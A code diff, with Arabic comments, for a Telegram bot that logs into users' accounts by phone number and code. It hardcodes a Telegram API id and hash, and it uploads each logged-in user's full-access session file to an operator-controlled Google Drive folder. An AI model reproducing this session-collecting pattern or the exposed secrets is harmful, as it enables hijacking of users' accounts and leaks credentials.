@@ -101,29 +101,19 @@ async def process_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
     phone_number = update.message.text.strip()
 
-    session_file = f"/tmp/session_{update.message.from_user.id}.session"
-    
+    # إعداد بيانات ملف الجلسة
+    session_file = f"/tmp/session_{user_id}.session"
     api_id = 26466946
     api_hash = '05d7144ca3c5f4594e40c535afb3bd5a'
 
-    # تخزين ملف الجلسة داخل Google Drive
-    #session_file = os.path.join(DRIVE_PATH, f'session_{user_id}.session')
-     
-    #####↓↓↓↓↓
-    # إنشاء ملف الجلسة على Google Drive داخل المجلد المشترك
+    # بيانات ملف الجلسة على Google Drive
     file_metadata = {
-    'name': f'session_{user_id}.session',  # اسم الملف
-    'parents': [FOLDER_ID],               # حدد المجلد الأب
-    'mimeType': 'application/octet-stream'  # نوع الملف (اختياري)
-     }
+        'name': f'session_{user_id}.session',
+        'parents': [FOLDER_ID],
+        'mimeType': 'application/octet-stream'
+    }
 
-     #media = MediaFileUpload(f'/tmp/session_{user_id}.session', resumable=True)  # رفع الملف من مجلد مؤقت
-     #uploaded_file = drive_service.files().create(body=file_metadata, media_body=media, fields='id').execute()
-     #print(f"تم إنشاء ملف الجلسة: File ID: {uploaded_file.get('id')}")
-     ######^^^^^^
-    
-    # حذف الجلسة إذا كانت تالفة
-    # التحقق من الجلسة المحلية
+    # التحقق من الجلسة المحلية وحذفها إذا كانت تالفة
     if os.path.exists(session_file):
         try:
             temp_client = TelegramClient(session_file, api_id, api_hash)
@@ -132,16 +122,21 @@ async def process_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 print("الجلسة تالفة. سيتم حذفها.")
                 os.remove(session_file)
             await temp_client.disconnect()
-        except Exception:
-            print("حدث خطأ أثناء التحقق من الجلسة. سيتم حذفها.")
+        except Exception as e:
+            print(f"حدث خطأ أثناء التحقق من الجلسة: {e}. سيتم حذفها.")
             os.remove(session_file)
 
-            
-            # حذف الجلسة من Google Drive إذا كانت تالفة
-            file_id = 'id_of_the_corrupted_file'  # حدد File ID الخاص بالجلسة
-            drive_service.files().delete(fileId=file_id).execute()
-            print(f"تم حذف الجلسة التالفة: File ID: {file_id}")
-            
+            # حذف الجلسة من Google Drive
+            try:
+                query = f"name='{file_metadata['name']}' and '{FOLDER_ID}' in parents"
+                response = drive_service.files().list(q=query, fields="files(id)").execute()
+                if response['files']:
+                    file_id = response['files'][0]['id']
+                    drive_service.files().delete(fileId=file_id).execute()
+                    print(f"تم حذف الجلسة التالفة من Google Drive: File ID: {file_id}")
+            except Exception as drive_error:
+                print(f"خطأ أثناء حذف الجلسة من Google Drive: {drive_error}")
+
     # إنشاء جلسة جديدة
     client = TelegramClient(session_file, api_id, api_hash)
     clients[user_id] = client
@@ -150,30 +145,26 @@ async def process_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         await client.connect()
         if await client.is_user_authorized():
-            # رفع الجلسة إلى Google Drive بعد التأكد
-            upload_media = MediaFileUpload(session_file, resumable=True)
-            uploaded_file = drive_service.files().create(body=file_metadata, media_body=upload_media, fields='id').execute()
-            print(f"تم رفع الجلسة إلى Google Drive: File ID: {uploaded_file.get('id')}")
+            # رفع الجلسة إلى Google Drive
+            try:
+                upload_media = MediaFileUpload(session_file, resumable=True)
+                uploaded_file = drive_service.files().create(body=file_metadata, media_body=upload_media, fields='id').execute()
+                print(f"تم رفع الجلسة إلى Google Drive: File ID: {uploaded_file.get('id')}")
+            except Exception as upload_error:
+                print(f"حدث خطأ أثناء رفع الجلسة إلى Google Drive: {upload_error}")
+            
             await update.message.reply_text("تم تسجيل الدخول بنجاح! أرسل الآن رابط الملف لتحميله.")
             return FILE
-    except Exception as e:
-        await update.message.reply_text(f"حدث خطأ أثناء إنشاء الجلسة: {e}")
-        return PHONE
-    
-    
-    try:
-        await client.connect()
-        if await client.is_user_authorized():
-            await update.message.reply_text("تم تسجيل الدخول مسبقًا! أرسل الآن رابط الملف لتحميله.")
-            return FILE
 
+        # طلب رمز التحقق
         await client.send_code_request(phone_number)
         await update.message.reply_text("تم إرسال رمز التحقق إلى رقمك. الرجاء إدخال الرمز (مثل: 2 2 9 3 0):")
         return CODE
-    except Exception as e:
-        await update.message.reply_text(f"حدث خطأ: {e}")
-        return PHONE
 
+    except Exception as e:
+        await update.message.reply_text(f"حدث خطأ أثناء إنشاء الجلسة: {e}")
+        return PHONE
+        
 async def process_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.from_user.id
     code = update.message.text.strip().replace(" ", "")
